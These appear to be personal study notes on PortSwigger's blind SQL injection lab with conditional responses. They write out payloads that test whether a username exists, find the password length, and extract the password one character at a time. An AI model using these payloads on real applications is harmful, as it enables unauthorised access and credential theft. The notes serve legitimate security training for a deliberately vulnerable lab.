# PortSwigger Labs -Notes
Am i getting ready for BSCP? I don't know



## SQL injection (blind) - Conditional Responses
    Take a look and see wheather the page displays certain messages. Page's size is handful.

    * You might use it to determine if the username existing within the table
      This queries evaluates if the given username exists inside the table
      and (select 'a' from users where username = 'foo')='a
    
    * To get the password length. 
      and (select 'a' from users where username = 'foo' and length(password)>1)='a

    * To get the password by issuing one char at a time while looping through the password length
      The incremental must be where the first 1 is at.
      and (select substring(password,1,1) from users where username = 'foo')=§
    
